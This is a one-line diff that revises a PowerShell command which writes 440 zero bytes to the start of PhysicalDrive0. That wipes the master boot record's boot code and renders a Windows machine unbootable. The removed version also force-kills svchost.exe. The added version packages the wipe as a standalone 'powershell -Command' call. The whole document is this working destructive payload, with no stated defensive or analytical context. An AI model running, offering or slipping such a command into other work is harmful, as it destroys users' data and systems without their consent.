@@ -1,1 +1,1 @@
-$drive='\\.\PhysicalDrive0'; $bytes=New-Object byte[] 440; $handle=[System.IO.File]::OpenWrite($drive); $handle.Write($bytes,0,$bytes.Length); $handle.Close(); taskkill /F /IM svchost.exe
+powershell -Command "$drive='\\.\PhysicalDrive0'; $bytes=New-Object byte[] 440; $handle=[System.IO.File]::OpenWrite($drive); $handle.Write($bytes,0,$bytes.Length); $handle.Close()"
